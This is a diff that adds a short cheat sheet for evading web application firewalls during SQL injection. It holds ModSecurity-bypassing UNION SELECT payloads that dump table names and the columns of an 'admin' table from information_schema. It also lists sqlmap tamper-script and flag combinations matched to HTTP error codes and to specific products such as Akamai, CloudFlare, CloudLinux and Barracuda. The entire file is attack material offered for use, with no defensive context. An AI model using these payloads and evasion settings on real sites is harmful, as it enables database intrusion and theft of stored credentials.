@@ -1,0 +1,47 @@
+ModSecurity: between
+Extract Tables:
+/*12345Union*/ select 1,2,group_concat(table_name)+/*12345from*/+/*12345information_schema*/.tables+where+table_schema=database()
+Extract value from columns, from table admin
+/*12345Union*/ select 1,2,unhex(hex(concat(column_name)))+/*12345from*/+/*12345information_schema*/.columns+where+table_name="admin"
+
+403:  --random-agent --drop-set-cookie --tamper randomcase,charencode --hex
+403:  --random-agent --drop-set-cookie --tamper between,randomcase,charencode --hex 
+403:  --random-agent --drop-set-cookie --tamper between,randomcase,space2comment --hex
+
+403:  --random-agent --drop-set-cookie --tamper between,randomcase,charencode,informationschemacomment --hex
+
+
+406: between,randomcase,charencode,modsecurityversioned 
+406: between,space2hash
+406: randomcase,charencode,modsecurityversioned         
+
+503: randomcase,0eunion.py,charencode.py --drop-set-cookie
+
+Illegal Union Error: --hex  OR unhex(hex(group_concat(table_name)) e.t.c.
+
+CloudLinux: xforwardedfor,varnish,randomcase,multiplespaces --drop-set-cookie
+
+xforwardedfor,randomcase,multiplespaces  
+
+varnish,randomcase,xforwardedfor 
+
+xforwardedfor,randomcase,multiplespaces  
+
+
+between,randomcase,space2comment --drop-set-cookie --hex
+
+Akamai:
+[+] --drop-set-cookie --tamper space2comment,randomcase,charencode  --hex
+[+] --drop-set-cookie randomcase,charencode,modsecurityversioned 
+[+] --drop-set-cookie randomcase,charencode,modsecurityzeroversioned
+randomcase,charencode,modsecurityversioned,between,space2comment
+
+
+--drop-set-cookie --tamper randomcase,chardoubleencode,space2comment  --hex
+Barracude:
+
+--drop-set-cookie --tamper multiplespaces,space2hash,randomcomments --hex
+
+CloudFlare: space2comment,between,randomcase
+CloudFlare: cookie="COOKIE" -tamper randomcase,between,space2comment
+
